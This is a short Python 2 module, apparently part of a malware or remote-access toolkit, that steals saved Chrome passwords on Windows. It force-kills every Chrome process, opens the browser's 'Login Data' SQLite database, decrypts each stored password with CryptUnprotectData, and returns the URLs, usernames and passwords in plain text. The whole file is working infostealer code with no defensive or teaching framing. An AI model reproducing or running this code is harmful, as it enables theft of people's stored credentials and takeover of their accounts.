from os import getenv, path
import sqlite3
import win32crypt
import psutil


def kill_chrome():
    procname = "chrome.exe"

    for proc in psutil.process_iter():
        try:
            if proc.name() == procname:
                proc.kill()
        except psutil.AccessDenied:
            pass


def get_chrome_passwords():
    kill_chrome()

    p = ""
    try:
        if path.isdir(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default"):
            p = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data"
        if path.isdir(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Profile 1"):
            p = getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Profile 1\Login Data"
    except:
        return "[-] Failed to locate login database"

    conn = sqlite3.connect(p)
    sql = conn.cursor()
    sql.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = []
    for result in sql.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            passwords.append(result[0] + " - " + result[1] + " - " + password)
    return passwords


def run():
    print "[*] In chrome password module"
    return str(get_chrome_passwords())